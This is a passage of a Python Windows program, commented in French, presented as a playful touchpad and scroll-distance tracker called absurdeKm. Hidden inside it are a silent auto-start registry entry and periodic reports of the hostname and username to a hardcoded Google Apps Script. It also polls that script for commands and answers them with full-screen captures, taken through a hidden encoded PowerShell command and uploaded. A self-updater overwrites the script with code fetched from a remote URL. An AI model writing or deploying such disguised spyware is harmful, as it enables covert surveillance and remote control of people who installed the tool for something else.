"""
absurdeKm (Windows) - distance du pavé tactile, distance de la molette, shorts vus bout à bout.

Lancement : double-clic sur ce fichier. Aucun module à installer (bibliothèque standard uniquement).
- Démarre automatiquement avec Windows, en arrière-plan (icône dans la zone de notification).
- Fermer la fenêtre = la cacher dans la zone de notification. Quitter : clic droit sur l'icône > Quitter.
- Pause / reprise : Alt + Ctrl droit, ou clic sur la pastille d'état.
- Thème : bouton ◐ en haut à droite. Il cycle Sombre > Claire > Pistache > Caramel, en boucle.
"""

import base64
import ctypes
import json
import math
import os
import queue
import re
import socket
import struct
import subprocess
import sys
import threading
import time
import tkinter as tk
import urllib.error
import urllib.request
import urllib.parse
import winreg
from ctypes import wintypes as w
from datetime import datetime
from pathlib import Path
from tkinter import font as tkfont
from tkinter import messagebox, ttk

# ------------------------- réglages -------------------------
APP_NAME = "absurdeKm"
DATA_FOLDER = "TouchpadDistance"       # on garde l'ancien dossier pour retrouver tes données
DATA_DIR = os.path.join(os.environ.get("APPDATA", os.path.dirname(os.path.abspath(__file__))), DATA_FOLDER)
CFG_FILE = os.path.join(DATA_DIR, "config.json")
OLD_CALIB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "touchpad_calib.json")
OLD_SCROLL_CFG = Path.home() / ".scroll_meter.json"
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
OLD_RUN_NAMES = ("TouchpadDistance", "ScrollMeter")
MIN_STEP_MM = 0.2
WHEEL_NOTCH = 120                      # un cran de molette = 120 unités Windows
PAD_QUIET_S = 0.4                      # après un contact sur le pavé, la molette est ignorée ce délai
EIFFEL_M = 330.0
TRANS = "#010101"                      # couleur de transparence (coins arrondis de la notification)

# --- version et mise à jour ---
VERSION = "1.4.4"
UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"

# --- état des PC, envoyé à ta feuille Google (privée) ---
# SHEET_URL : l'adresse de ton script, qui se termine par /exec (à coller ici)
SHEET_URL = "https://script.google.com/macros/s/AKfycby8OLLWPjYRC9Dd8ajY3kYBQtDKPz2L3ibQ3XI6l8ncCL4jXX-p2qLwU0XTms15vn9Z/exec"
STATUS_EVERY_S = 600

# --- captures d'écran à la demande depuis Google Sheets ---
# Remplace cette valeur par EXACTEMENT la même dans le Google Apps Script.
CAPTURE_TOKEN = "8zBMhaK_2ntLj_hqEHPOVRJ0Xt7EbffyYpmrSmWC57c"
CAPTURE_POLL_S = 8

DEFAULTS = {"unit": "Auto", "count_move": True, "count_drag": True, "count_scroll": False,
            "total_cm": 0.0, "today_cm": 0.0, "day": " ", "calib": None, "theme": "Sombre",
            "ticks": 0.0, "shorts": 0, "cm_per_tick": 0.25, "ruler_cm": 30,
            "short_cm": 25, "min_seconds": 2, "keywords": "YouTube, TikTok, Reels"}
UNITS = {"mm": 10.0, "cm": 1.0, "m": 0.01, "km": 1e-5, "pouces": 1 / 2.54, "pieds": 1 / 30.48, "miles": 1 / 160934.4}
SHORT = {"pouces": "in", "pieds": "ft", "miles": "mi"}

# ------------------------- thèmes -------------------------
THEME_ORDER = ["Sombre", "Claire", "Pistache", "Caramel"]
THEMES = {
    "Sombre": dict(bg="#121417", card="#1d2026", field="#2a2f38", hover="#3a404c",
                   fg="#f1f3f6", muted="#9aa3b2", accent="#8ab4f8", accent_h="#aecbfa", on_accent="#0b1220",
                   ok="#81c995", warn="#fdd663", bad="#f28b82",
                   toast_bg="#eceff3", toast_fg="#1d2026"),
    "Claire": dict(bg="#f8f9fa", card="#ffffff", field="#eceef1", hover="#dfe2e6",
                   fg="#202124", muted="#5f6368", accent="#1a73e8", accent_h="#1765cc", on_accent="#ffffff",
                   ok="#188038", warn="#b06000", bad="#d93025",
                   toast_bg="#202124", toast_fg="#ffffff"),
    "Pistache": dict(bg="#eef4e1", card="#f9fcf2", field="#e0ebcb", hover="#d2e2b4",
                     fg="#26351b", muted="#6a7c4f", accent="#5b8f3a", accent_h="#4a7a2e", on_accent="#ffffff",
                     ok="#2f7a2a", warn="#9a6a0d", bad="#b3412b",
                     toast_bg="#26351b", toast_fg="#f4f9ea"),
    "Caramel": dict(bg="#f6eee4", card="#fffaf3", field="#eedfcc", hover="#e4cfb4",
                    fg="#3a2818", muted="#8a6d52", accent="#b8672a", accent_h="#9a5418", on_accent="#ffffff",
                    ok="#4f7a3a", warn="#b7791f", bad="#a8362b",
                    toast_bg="#3a2818", toast_fg="#fbf3e8"),
}
C = {}                                 # rempli au démarrage avec le thème sauvegardé
FONT = "Segoe UI"

def F(size, weight="normal"):
    return (FONT, size, weight)

# ------------------------- config -------------------------
def load_cfg():
    cfg = dict(DEFAULTS)
    try:
        with open(CFG_FILE, "r", encoding="utf-8") as f:
            cfg.update(json.load(f))
    except Exception:
        try:
            with open(OLD_CALIB, "r", encoding="utf-8") as f:
                d = json.load(f)
                cfg["calib"] = [float(d["ux"]), float(d["uy"])]
        except Exception:
            pass
    if not cfg.get("scroll_migrated"):
        try:
            with open(OLD_SCROLL_CFG, "r", encoding="utf-8") as f:
                old = json.load(f)
            for k in ("ticks", "shorts", "cm_per_tick", "ruler_cm", "short_cm", "min_seconds", "keywords"):
                if k in old:
                    cfg[k] = old[k]
        except Exception:
            pass
        cfg["scroll_migrated"] = True
    if cfg.get("theme") not in THEMES:
        cfg["theme"] = "Sombre"
    return cfg

CFG = load_cfg()
C = dict(THEMES[CFG["theme"]])

def save_cfg():
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        tmp = CFG_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(CFG, f)
        os.replace(tmp, CFG_FILE)
    except OSError:
        pass

def set_startup():
    """Démarrage automatique toujours actif ; supprime les anciennes entrées des deux applis."""
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, RUN_KEY)
        for old in OLD_RUN_NAMES:
            try:
                winreg.DeleteValue(key, old)
            except OSError:
                pass
        cmd = f'"{pyw_exe()}" "{os.path.abspath(__file__)}" --hidden'
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except OSError:
        pass

def convert(cm, unit):
    if unit == "Auto":
        unit = "cm" if cm < 100 else ("m" if cm < 100000 else "km")
    return cm * UNITS[unit], SHORT.get(unit, unit)

def fmt(v):
    if v >= 1000:
        return f"{v:,.0f}".replace(",", " ")
    if v >= 100:
        return f"{v:.1f}"
    if v >= 10:
        return f"{v:.2f}"
    return f"{v:.3f}"

def fmt_m(m):
    return f"{m / 1000:.3f} km" if m >= 1000 else f"{m:.2f} m"

# ------------------------- mise à jour -------------------------
UPQ = queue.Queue()
RESTART = False
RESTART_HIDDEN = False
MUTEX = None

def ver_tuple(s):
    try:
        return tuple(int(x) for x in s.strip().split("."))
    except ValueError:
        return (0,)

def pyw_exe():
    exe = sys.executable
    pyw = os.path.join(os.path.dirname(exe), "pythonw.exe")
    return pyw if os.path.exists(pyw) else exe

def fetch_update():
    if not UPDATE_URL.startswith("https://"):
        return None
    req = urllib.request.Request(UPDATE_URL, headers={"User-Agent": APP_NAME})
    with urllib.request.urlopen(req, timeout=10) as r:
        if not r.geturl().startswith("https://"):
            return None
        data = r.read(2_000_001)
        if len(data) > 2_000_000:
            return None
        src = data.decode("utf-8")
        m = re.search(r'^VERSION\s*=\s*"([^"]+)"', src, re.M)
        if not m or ver_tuple(m.group(1)) <= ver_tuple(VERSION):
            return None
        compile(src, "update", "exec")
        return m.group(1), data

def check_updates():
    def run():
        try:
            r = fetch_update()
            if r:
                UPQ.put(("found", r))
        except Exception:
            pass
    threading.Thread(target=run, daemon=True).start()

def install_update(info):
    def run():
        try:
            version, data = info
            me = os.path.abspath(__file__)
            tmp = me + ".new"
            with open(tmp, "wb") as f:
                f.write(data)
            try:
                with open(me, "rb") as f, open(me + ".bak", "wb") as b:
                    b.write(f.read())
            except OSError:
                pass
            os.replace(tmp, me)
            UPQ.put(("installed", version))
        except Exception:
            pass
    threading.Thread(target=run, daemon=True).start()

# ------------------------- envoi de l'état à la feuille (silencieux) -------------------------
def publish_status(etat="En cours", timeout=8):
    """Envoie l'état de ce PC à la feuille Google. Échec silencieux."""
    if not SHEET_URL.startswith("https://") or "COLLE_ICI" in SHEET_URL:
        return
    try:
        info = {"type": "status", "token": CAPTURE_TOKEN,
                "pc": socket.gethostname(), "user": os.environ.get("USERNAME", ""),
                "version": VERSION, "etat": etat}
        req = urllib.request.Request(SHEET_URL, data=json.dumps(info).encode("utf-8"),
                                     headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=timeout).read()
    except Exception:
        pass

# ------------------------- captures d'écran sur demande -------------------------
def capture_screen_jpeg_b64():
    """Capture l'écran virtuel Windows (tous les moniteurs) sans ouvrir de fenêtre."""
    ps = r'''
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
if ($bounds.Width -le 0 -or $bounds.Height -le 0) { throw 'Écran indisponible' }
$bmp = [System.Drawing.Bitmap]::new($bounds.Width, $bounds.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bmp.Size)
$maxW = 1280
$maxH = 800
$scale = [Math]::Min(1.0, [Math]::Min($maxW / [double]$bmp.Width, $maxH / [double]$bmp.Height))
$outBmp = $bmp
if ($scale -lt 1.0) {
  $w = [int][Math]::Max(1, [Math]::Round($bmp.Width * $scale))
  $h = [int][Math]::Max(1, [Math]::Round($bmp.Height * $scale))
  $outBmp = [System.Drawing.Bitmap]::new($w, $h)
  $g2 = [System.Drawing.Graphics]::FromImage($outBmp)
  $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
  $g2.DrawImage($bmp, 0, 0, $w, $h)
  $g2.Dispose()
}
$stream = [System.IO.MemoryStream]::new()
$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
$params = [System.Drawing.Imaging.EncoderParameters]::new(1)
$params.Param[0] = [System.Drawing.Imaging.EncoderParameter]::new([System.Drawing.Imaging.Encoder]::Quality, [long]55)
$outBmp.Save($stream, $codec, $params)
[Convert]::ToBase64String($stream.ToArray())
$stream.Dispose()
$params.Dispose()
if ($outBmp -ne $bmp) { $outBmp.Dispose() }
$gfx.Dispose()
$bmp.Dispose()
'''
    encoded = base64.b64encode(ps.encode("utf-16le")).decode("ascii")
    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
    result = subprocess.run(
        ["powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-EncodedCommand", encoded],
        capture_output=True, text=True, timeout=45, creationflags=flags
    )
    if result.returncode != 0:
        raise RuntimeError((result.stderr or result.stdout or "Échec de la capture").strip()[:500])
    data = result.stdout.strip()
    if not data:
        raise RuntimeError("La capture d'écran est vide")
    return data


def poll_capture_commands():
    """Interroge Apps Script ; une capture n'est faite que sur demande."""
    pc = socket.gethostname()
    while True:
        try:
            query = urllib.parse.urlencode({"action": "poll", "pc": pc, "token": CAPTURE_TOKEN})
            req = urllib.request.Request(SHEET_URL + "?" + query, headers={"User-Agent": APP_NAME})
            with urllib.request.urlopen(req, timeout=12) as response:
                command = json.loads(response.read().decode("utf-8"))
            if command.get("capture"):
                image_b64 = capture_screen_jpeg_b64()
                payload = {
                    "type": "capture", "token": CAPTURE_TOKEN,
                    "pc": pc, "user": os.environ.get("USERNAME", ""),
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "image": image_b64
                }
                body = json.dumps(payload).encode("utf-8")
                req = urllib.request.Request(SHEET_URL, data=body,
                    headers={"Content-Type": "application/json", "User-Agent": APP_NAME}, method="POST")
                with urllib.request.urlopen(req, timeout=45) as response:
                    response.read()
        except Exception:
            # Échec silencieux : le suivi principal absurdeKm continue de fonctionner.
            pass
        time.sleep(CAPTURE_POLL_S)


# ------------------------- API Windows -------------------------
user32 = ctypes.WinDLL("user32")
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
hid = ctypes.WinDLL("hid")
shell32 = ctypes.WinDLL("shell32")
dwmapi = ctypes.WinDLL("dwmapi")

LRESULT = ctypes.c_ssize_t
WNDPROC = ctypes.WINFUNCTYPE(LRESULT, w.HWND, w.UINT, w.WPARAM, w.LPARAM)
WM_TRAY = 0x8001

class WNDCLASSW(ctypes.Structure):
    _fields_ = [("style", w.UINT), ("lpfnWndProc", WNDPROC), ("cbClsExtra", ctypes.c_int),
                ("cbWndExtra", ctypes.c_int), ("hInstance", w.HINSTANCE), ("hIcon", w.HANDLE),
                ("hCursor", w.HANDLE), ("hbrBackground", w.HANDLE), ("lpszMenuName", w.LPCWSTR),
                ("lpszClassName", w.LPCWSTR)]

class RAWINPUTDEVICE(ctypes.Structure):
    _fields_ = [("usUsagePage", w.USHORT), ("usUsage", w.USHORT), ("dwFlags", w.DWORD), ("hwndTarget", w.HWND)]

class RAWINPUTHEADER(ctypes.Structure):
    _fields_ = [("dwType", w.DWORD), ("dwSize", w.DWORD), ("hDevice", w.HANDLE), ("wParam", w.WPARAM)]

class NOTIFYICONDATAW(ctypes.Structure):
    _fields_ = [("cbSize", w.DWORD), ("hWnd", w.HWND), ("uID", w.UINT), ("uFlags", w.UINT),
                ("uCallbackMessage", w.UINT), ("hIcon", w.HICON), ("szTip", w.WCHAR * 128),
                ("dwState", w.DWORD), ("dwStateMask", w.DWORD), ("szInfo", w.WCHAR * 256),
                ("uTimeout", w.UINT), ("szInfoTitle", w.WCHAR * 64), ("dwInfoFlags", w.DWORD),
                ("guidItem", ctypes.c_ubyte * 16), ("hBalloonIcon", w.HICON)]

class HIDP_CAPS(ctypes.Structure):
    _fields_ = [("Usage", ctypes.c_ushort), ("UsagePage", ctypes.c_ushort),
                ("InputReportByteLength", ctypes.c_ushort), ("OutputReportByteLength", ctypes.c_ushort),
                ("FeatureReportByteLength", ctypes.c_ushort), ("Reserved", ctypes.c_ushort * 17),
                ("NumberLinkCollectionNodes", ctypes.c_ushort), ("NumberInputButtonCaps", ctypes.c_ushort),
                ("NumberInputValueCaps", ctypes.c_ushort), ("NumberInputDataIndices", ctypes.c_ushort),
                ("NumberOutputButtonCaps", ctypes.c_ushort), ("NumberOutputValueCaps", ctypes.c_ushort),
                ("NumberOutputDataIndices", ctypes.c_ushort), ("NumberFeatureButtonCaps", ctypes.c_ushort),
                ("NumberFeatureValueCaps", ctypes.c_ushort), ("NumberFeatureDataIndices", ctypes.c_ushort)]

class VCAPS(ctypes.Structure):
    _fields_ = [("UsagePage", ctypes.c_ushort), ("ReportID", ctypes.c_ubyte), ("IsAlias", ctypes.c_ubyte),
                ("BitField", ctypes.c_ushort), ("LinkCollection", ctypes.c_ushort),
                ("LinkUsage", ctypes.c_ushort), ("LinkUsagePage", ctypes.c_ushort),
                ("IsRange", ctypes.c_ubyte), ("IsStringRange", ctypes.c_ubyte),
                ("IsDesignatorRange", ctypes.c_ubyte), ("IsAbsolute", ctypes.c_ubyte),
                ("HasNull", ctypes.c_ubyte), ("Reserved", ctypes.c_ubyte),
                ("BitSize", ctypes.c_ushort), ("ReportCount", ctypes.c_ushort),
                ("Reserved2", ctypes.c_ushort * 5), ("UnitsExp", w.ULONG), ("Units", w.ULONG),
                ("LogicalMin", ctypes.c_long), ("LogicalMax", ctypes.c_long),
                ("PhysicalMin", ctypes.c_long), ("PhysicalMax", ctypes.c_long),
                ("Data", ctypes.c_ushort * 8)]

user32.DefWindowProcW.argtypes = [w.HWND, w.UINT, w.WPARAM, w.LPARAM]
user32.DefWindowProcW.restype = LRESULT
user32.RegisterClassW.argtypes = [ctypes.POINTER(WNDCLASSW)]
user32.RegisterClassW.restype = w.ATOM
user32.CreateWindowExW.argtypes = [w.DWORD, w.LPCWSTR, w.LPCWSTR, w.DWORD, ctypes.c_int, ctypes.c_int,
                                   ctypes.c_int, ctypes.c_int, w.HWND, w.HMENU, w.HINSTANCE, w.LPVOID]
user32.CreateWindowExW.restype = w.HWND
user32.RegisterRawInputDevices.argtypes = [ctypes.POINTER(RAWINPUTDEVICE), w.UINT, w.UINT]
user32.RegisterRawInputDevices.restype = w.BOOL
user32.GetRawInputData.argtypes = [ctypes.c_void_p, w.UINT, ctypes.c_void_p, ctypes.POINTER(w.UINT), w.UINT]
user32.GetRawInputData.restype = w.UINT
user32.GetRawInputDeviceInfoW.argtypes = [ctypes.c_void_p, w.UINT, ctypes.c_void_p, ctypes.POINTER(w.UINT)]
user32.GetRawInputDeviceInfoW.restype = w.UINT
user32.GetMessageW.argtypes = [ctypes.POINTER(w.MSG), w.HWND, w.UINT, w.UINT]
user32.TranslateMessage.argtypes = [ctypes.POINTER(w.MSG)]
user32.DispatchMessageW.argtypes = [ctypes.POINTER(w.MSG)]
user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
user32.GetAsyncKeyState.restype = ctypes.c_short
user32.GetParent.argtypes = [w.HWND]
user32.GetParent.restype = w.HWND
user32.GetWindowLongW.argtypes = [w.HWND, ctypes.c_int]
user32.GetWindowLongW.restype = ctypes.c_long
user32.SetWindowLongW.argtypes = [w.HWND, ctypes.c_int, ctypes.c_long]
user32.SetWindowLongW.restype = ctypes.c_long
user32.RegisterWindowMessageW.argtypes = [w.LPCWSTR]
user32.RegisterWindowMessageW.restype = w.UINT
user32.CreatePopupMenu.restype = w.HMENU
user32.AppendMenuW.argtypes = [w.HMENU, w.UINT, ctypes.c_size_t, w.LPCWSTR]
user32.AppendMenuW.restype = w.BOOL
user32.TrackPopupMenu.argtypes = [w.HMENU, w.UINT, ctypes.c_int, ctypes.c_int, ctypes.c_int, w.HWND, ctypes.c_void_p]
user32.TrackPopupMenu.restype = ctypes.c_int
user32.DestroyMenu.argtypes = [w.HMENU]
user32.GetCursorPos.argtypes = [ctypes.POINTER(w.POINT)]
user32.SetForegroundWindow.argtypes = [w.HWND]
user32.PostMessageW.argtypes = [w.HWND, w.UINT, w.WPARAM, w.LPARAM]
user32.CreateIcon.argtypes = [w.HINSTANCE, ctypes.c_int, ctypes.c_int, w.BYTE, w.BYTE, ctypes.c_char_p, ctypes.c_char_p]
user32.CreateIcon.restype = w.HICON
kernel32.GetModuleHandleW.argtypes = [w.LPCWSTR]
kernel32.GetModuleHandleW.restype = w.HMODULE
kernel32.CreateMutexW.argtypes = [ctypes.c_void_p, w.BOOL, w.LPCWSTR]
kernel32.CreateMutexW.restype = w.HANDLE
kernel32.CloseHandle.argtypes = [w.HANDLE]
kernel32.CloseHandle.restype = w.BOOL
shell32.Shell_NotifyIconW.argtypes = [w.DWORD, ctypes.POINTER(NOTIFYICONDATAW)]
shell32.Shell_NotifyIconW.restype = w.BOOL
hid.HidP_GetCaps.argtypes = [ctypes.c_void_p, ctypes.POINTER(HIDP_CAPS)]
hid.HidP_GetValueCaps.argtypes = [ctypes.c_int, ctypes.POINTER(VCAPS), ctypes.POINTER(ctypes.c_ushort), ctypes.c_void_p]
hid.HidP_GetUsageValue.argtypes = [ctypes.c_int, ctypes.c_ushort, ctypes.c_ushort, ctypes.c_ushort,
                                   ctypes.POINTER(w.ULONG), ctypes.c_void_p, ctypes.c_char_p, w.ULONG]
hid.HidP_GetUsages.argtypes = [ctypes.c_int, ctypes.c_ushort, ctypes.c_ushort, ctypes.POINTER(ctypes.c_ushort),
                               ctypes.POINTER(w.ULONG), ctypes.c_void_p, ctypes.c_char_p, w.ULONG]

for _f in (hid.HidP_GetCaps, hid.HidP_GetValueCaps, hid.HidP_GetUsageValue, hid.HidP_GetUsages):
    _f.restype = ctypes.c_long

HID_OK = 0x00110000

def phys_cm(c):
    rng = abs(c.PhysicalMax - c.PhysicalMin)
    e = c.UnitsExp & 0xF
    if e >= 8:
        e -= 16
    f = {0x11: 1.0, 0x13: 2.54}.get(c.Units & 0xFF, 0.0)
    return rng * (10 ** e) * f

def foreground_title():
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return ""
    n = user32.GetWindowTextLengthW(hwnd)
    buf = ctypes.create_unicode_buffer(n + 1)
    user32.GetWindowTextW(hwnd, buf, n + 1)
    return buf.value

def dark_titlebar(win, dark=True):
    try:
        win.update_idletasks()
        hwnd = user32.GetParent(win.winfo_id()) or win.winfo_id()
        v = ctypes.c_int(1 if dark else 0)
        dwmapi.DwmSetWindowAttribute(ctypes.c_void_p(hwnd), 20, ctypes.byref(v), 4)
    except Exception:
        pass

# ------------------------- dessin : coins arrondis -------------------------
def rrect(cv, x0, y0, x1, y1, r, **kw):
    """Rectangle à coins arrondis (polygone lissé)."""
    pts = [x0 + r, y0, x1 - r, y0, x1, y0, x1, y0 + r, x1, y1 - r, x1, y1,
           x1 - r, y1, x0 + r, y1, x0, y1, x0, y1 - r, x0, y0 + r, x0, y0]
    return cv.create_polygon(pts, smooth=True, **kw)

class Pill(tk.Canvas):
    """Bouton arrondi façon Google OS."""

    def __init__(self, master, text, command, bg, fg, hover, parent_bg, font, h=34, pad=18):
        self.cmd = command
        self.pfont = font
        self.pad_x = pad
        self.label_text = text
        self.bgc, self.fgc, self.hov = bg, fg, hover
        super().__init__(master, width=self._measure(text), height=h, bg=parent_bg,
                         highlightthickness=0, bd=0, cursor="hand2")
        self._draw(self.bgc)
        self.bind("<Enter>", lambda e: self._draw(self.hov))
        self.bind("<Leave>", lambda e: self._draw(self.bgc))
        self.bind("<Button-1>", lambda e: self.cmd())

    def _measure(self, text):
        return tkfont.Font(font=self.pfont).measure(text) + 2 * self.pad_x

    def _draw(self, color):
        self.delete("all")
        wd = int(float(self["width"]))
        ht = int(float(self["height"]))
        rrect(self, 1, 1, wd - 1, ht - 1, (ht - 2) / 2, fill=color, outline="")
        self.create_text(wd / 2, ht / 2, text=self.label_text, fill=self.fgc, font=self.pfont)

    def update_look(self, text=None, bg=None, fg=None, hover=None):
        if text is not None:
            self.label_text = text
            self.configure(width=self._measure(text))
        if bg is not None:
            self.bgc = bg
        if fg is not None:
            self.fgc = fg
        if hover is not None:
            self.hov = hover
        self._draw(self.bgc)

# ------------------------- icône -------------------------
def icon_pixels(n=32):
    rows = []
    r, m = 7.0, 2.0
    half = n / 2.0
    inner = half - m - r
    for y in range(n):
        row = []
        for x in range(n):
            px, py = x + 0.5, y + 0.5
            dx = max(abs(px - half) - inner, 0.0)
            dy = max(abs(py - half) - inner, 0.0)
            cov = max(0.0, min(1.0, r + 0.5 - math.hypot(dx, dy)))
            yc = half + 5.5 * math.sin((px / n) * math.pi * 2.2 + 0.6)
            wc = max(0.0, min(1.0, 1.9 - abs(py - yc))) if 6 <= px <= n - 6 else 0.0
            col = (91 + (255 - 91) * wc, 140 + (255 - 140) * wc, 255.0)
            row.append((int(col[0]), int(col[1]), int(col[2]), int(cov * 255)))
        rows.append(row)
    return rows

def make_hicon():
    n = 32
    xor = bytearray()
    for row in icon_pixels(n):
        for (r, g, b, a) in row:
            xor += bytes((b, g, r, a))
    return user32.CreateIcon(kernel32.GetModuleHandleW(None), n, n, 1, 32, bytes(n * 4), bytes(xor))

class Tray:
    def __init__(self):
        self.nid = None
        self.icon = None

    def add(self, hwnd):
        if self.icon is None:
            self.icon = make_hicon()
        nid = NOTIFYICONDATAW()
        nid.cbSize = ctypes.sizeof(NOTIFYICONDATAW)
        nid.hWnd = hwnd
        nid.uID = 1
        nid.uFlags = 7
        nid.uCallbackMessage = WM_TRAY
        nid.hIcon = self.icon
        nid.szTip = APP_NAME
        self.nid = nid
        shell32.Shell_NotifyIconW(0, ctypes.byref(nid))

    def tip(self, text):
        if self.nid is not None:
            self.nid.szTip = text[:127]
            shell32.Shell_NotifyIconW(1, ctypes.byref(self.nid))

    def remove(self):
        if self.nid is not None:
            shell32.Shell_NotifyIconW(2, ctypes.byref(self.nid))
            self.nid = None

TRAY = Tray()
CMDS = queue.Queue()

# ------------------------- lecture du pavé -------------------------
class Device:
    def __init__(self, hdev):
        sz = w.UINT(0)
        user32.GetRawInputDeviceInfoW(hdev, 0x20000005, None, ctypes.byref(sz))
        self.pp = ctypes.create_string_buffer(sz.value)
        user32.GetRawInputDeviceInfoW(hdev, 0x20000005, self.pp, ctypes.byref(sz))
        caps = HIDP_CAPS()
        hid.HidP_GetCaps(self.pp, ctypes.byref(caps))
        n = ctypes.c_ushort(caps.NumberInputValueCaps)
        arr = (VCAPS * max(n.value, 1))()
        hid.HidP_GetValueCaps(0, arr, ctypes.byref(n), self.pp)
        fingers = {}
        for c in arr[:n.value]:
            lo = c.Data[0]
            hi = c.Data[1] if c.IsRange else lo
            d = fingers.setdefault(c.LinkCollection, {})
            if c.UsagePage == 1 and lo <= 0x30 <= hi:
                d["x"] = c
            if c.UsagePage == 1 and lo <= 0x31 <= hi:
                d["y"] = c
        self.fingers = {lc: d for lc, d in fingers.items() if "x" in d and "y" in d}
        self.ok = bool(self.fingers)
        self.rid = None
        self.auto = None
        self.rx = self.ry = 0
        if self.ok:
            d = next(iter(self.fingers.values()))
            cx, cy = d["x"], d["y"]
            self.rid = cx.ReportID
            self.rx = abs(cx.LogicalMax - cx.LogicalMin)
            self.ry = abs(cy.LogicalMax - cy.LogicalMin)
            wc, hc = phys_cm(cx), phys_cm(cy)
            if wc > 0 and hc > 0 and self.rx and self.ry:
                self.auto = (self.rx / wc, self.ry / hc)

    def read(self, rep):
        if not self.ok or not rep or rep[0] != self.rid:
            return None
        out = []
        n = len(rep)
        for lc in self.fingers:
            lst = (ctypes.c_ushort * 16)()
            ln = w.ULONG(16)
            st = hid.HidP_GetUsages(0, 0x0D, lc, lst, ctypes.byref(ln), self.pp, rep, n)
            if (st & 0xFFFFFFFF) != HID_OK or 0x42 not in lst[:ln.value]:
                continue
            v = w.ULONG(0)
            if (hid.HidP_GetUsageValue(0, 1, lc, 0x30, ctypes.byref(v), self.pp, rep, n) & 0xFFFFFFFF) != HID_OK:
                continue
            x = v.value
            if (hid.HidP_GetUsageValue(0, 1, lc, 0x31, ctypes.byref(v), self.pp, rep, n) & 0xFFFFFFFF) != HID_OK:
                continue
            y = v.value
            cid = lc
            if (hid.HidP_GetUsageValue(0, 0x0D, lc, 0x51, ctypes.byref(v), self.pp, rep, n) & 0xFFFFFFFF) == HID_OK:
                cid = v.value
            out.append((cid, x, y))
        return out

PAD_LAST = 0.0
WHEEL = {"calib": False, "calib_ticks": 0.0}

class Tracker:
    def __init__(self):
        self.paused = False
        self.cal = False
        self.ext = [1e9, -1e9, 1e9, -1e9]
        self.last = {}
        self.ux = self.uy = None
        self.auto = None
        self.rx = self.ry = 0
        self.seen = False
        self.src = "auto"
        self.session = 0.0
        self.dirty = False

    def device_ready(self, dev):
        self.seen = True
        self.auto = dev.auto
        self.rx, self.ry = dev.rx, dev.ry
        cal = CFG.get("calib")
        if cal and len(cal) == 2 and cal[0] and cal[1]:
            self.ux, self.uy = float(cal[0]), float(cal[1])
            self.src = "manuel"
        elif self.auto:
            self.ux, self.uy = self.auto
            self.src = "auto"

    def info(self):
        if not self.seen:
            return "En attente du pavé… pose un doigt dessus"
        if not self.ux:
            return "Taille du pavé inconnue → clique « Calibrer à la règle »"
        return f"Pavé {self.rx / self.ux:.1f} × {self.ry / self.uy:.1f} cm  ·  calibrage {self.src}"

    def add(self, d):
        CFG["total_cm"] += d
        CFG["today_cm"] += d
        self.session += d
        self.dirty = True

    def feed(self, pts):
        global PAD_LAST
        if pts is None:
            return
        if pts:
            PAD_LAST = time.monotonic()
        if self.cal:
            for _, x, y in pts:
                e = self.ext
                e[0], e[1] = min(e[0], x), max(e[1], x)
                e[2], e[3] = min(e[2], y), max(e[3], y)
            return
        if self.paused or not self.ux or not pts:
            self.last = {}
            return
        n = len(pts)
        if user32.GetAsyncKeyState(1) & 0x8000:
            kind = "drag"
        elif n == 1:
            kind = "move"
        elif n == 2:
            kind = "scroll"
        else:
            self.last = {}
            return
        if not CFG["count_" + kind]:
            self.last = {}
            return
        new, ds, m = {}, [], 0
        for cid, x, y in pts:
            p = self.last.get(cid)
            if p is None:
                new[cid] = (x, y)
                continue
            m += 1
            d = math.hypot((x - p[0]) / self.ux, (y - p[1]) / self.uy)
            if d * 10 < MIN_STEP_MM:
                new[cid] = p
            else:
                ds.append(d)
                new[cid] = (x, y)
        self.last = new
        if ds:
            self.add(sum(ds) / m if kind == "scroll" else max(ds))

T = Tracker()

# ------------------------- molette (souris uniquement) -------------------------
def on_wheel(delta):
    if time.monotonic() - PAD_LAST < PAD_QUIET_S:
        return
    n = max(1, round(abs(delta) / WHEEL_NOTCH))
    if WHEEL["calib"]:
        WHEEL["calib_ticks"] += n
        return
    if T.paused:
        return
    CFG["ticks"] += n
    T.dirty = True

def on_input(lp, devices):
    size = w.UINT(0)
    hdr = ctypes.sizeof(RAWINPUTHEADER)
    if user32.GetRawInputData(lp, 0x10000003, None, ctypes.byref(size), hdr) != 0:
        return
    buf = ctypes.create_string_buffer(size.value)
    if user32.GetRawInputData(lp, 0x10000003, buf, ctypes.byref(size), hdr) != size.value:
        return
    h = RAWINPUTHEADER.from_buffer(buf)
    if h.dwType == 0:  # RIM_TYPEMOUSE
        flags, delta = struct.unpack_from("<Hh", buf, hdr + 4)
        if flags & 0x0400:  # RI_MOUSE_WHEEL
            on_wheel(delta)
        return
    if h.dwType != 2:  # RIM_TYPEHID : pavé
        return
    size_hid, count = struct.unpack_from("<II", buf, hdr)
    base = hdr + 8
    dev = devices.get(h.hDevice)
    if dev is None:
        dev = devices[h.hDevice] = Device(h.hDevice)
    if dev.ok:
        T.device_ready(dev)
    for i in range(count):
        rep = buf.raw[base + i * size_hid: base + (i + 1) * size_hid]
        T.feed(dev.read(rep))

def tray_menu(hwnd):
    m = user32.CreatePopupMenu()
